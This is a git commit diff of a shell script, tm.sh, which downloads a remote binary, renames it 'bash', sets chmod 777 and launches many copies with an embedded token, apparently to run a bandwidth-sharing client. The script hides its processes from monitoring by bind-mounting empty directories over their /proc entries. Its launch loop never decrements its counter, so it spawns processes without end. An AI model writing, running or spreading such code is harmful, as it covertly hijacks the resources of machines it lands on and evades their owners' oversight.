a42c16d3ee68757acd14d37b3e303a7f25a7a37b
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2025-04-23 19:52:53 +0800

    Update tm.sh

--- tm.sh
+++ tm.sh
@@ -1,15 +1,27 @@
 #!/bin/sh
 
+num="40"
 token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
-tmp="$(mktemp -d)" && cd "$tmp"
-wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
-chmod 777 "./bash"
-if [ "$1" == "1" ]; then
-  i=39; while [ "$i" -gt "0" ]; do
-    ./bash start accept --token "${token}" 2>&1 &
-    i=$((i-1)); 
-  done
-  ./bash start accept --token "${token}" 2>&1
-else
-  ./bash start accept --token "${token}" >/dev/null 2>&1 &
-fi
+execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
+
+execPath="`mktemp -d`/bash"
+wget -qO "${execPath}" "${execUrl}"
+chmod 777 "${execPath}"
+
+hPid() {
+  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
+}
+
+while [ "$num" -gt "0" ]; do
+  execDir=`mktemp -d`;
+  execTmp="${execDir}/bash"
+  ln -sf "$execPath" "$execTmp";
+  cd "${execDir}"
+  "${execTmp}" start accept --token "${token}" 2>&1 &
+  hPid "$!"
+  i=$((i-1)); 
+done
+
+hPid "$$"
+[ "$1" == "1" ] && wait
+
